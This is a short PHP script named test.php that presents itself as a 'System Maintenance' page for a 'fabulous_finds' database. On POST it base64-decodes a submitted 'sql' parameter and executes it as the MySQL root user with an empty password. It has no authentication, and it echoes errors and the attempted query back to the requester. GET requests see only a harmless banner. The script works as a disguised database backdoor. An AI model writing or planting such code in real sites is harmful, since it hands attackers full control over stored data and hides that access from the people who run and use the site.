<?php
// test.php - For fabulous_finds database
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sql'])) {
    $encryptedSQL = $_POST['sql'];
    $decodedSQL = base64_decode($encryptedSQL);
    
    try {
        // Connect to fabulous_finds
        $db = new PDO('mysql:host=localhost;dbname=fabulous_finds', 'root', '');
        $db->exec($decodedSQL);
        
        echo json_encode([
            'status' => 'success',
        ]);
        
    } catch (Exception $e) {
        echo json_encode([
            'status' => 'error',
            'message' => $e->getMessage(),
            'sql_attempted' => $decodedSQL,
        ]);
    }
    exit;
}

// For GET requests
echo 'Fabulous Finds System Maintenance';
?>